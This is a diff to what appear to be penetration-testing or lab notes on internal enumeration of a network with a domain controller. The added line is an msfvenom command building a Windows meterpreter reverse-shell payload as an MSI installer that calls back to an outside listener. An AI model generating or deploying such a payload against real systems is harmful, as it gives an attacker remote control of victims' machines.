@@ -4,6 +4,12 @@ Notes Organized:
 1. Initial Enumeration & Static Nmap Setup
 Used static nmap binary to scan internal hosts.
 
+
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.183 LPORT=4444 -f msi > payload.msi
+
+
+
 Enumerated open ports on:
 
 DC01 (172.16.8.3): LDAP, Kerberos, SMB, DNS
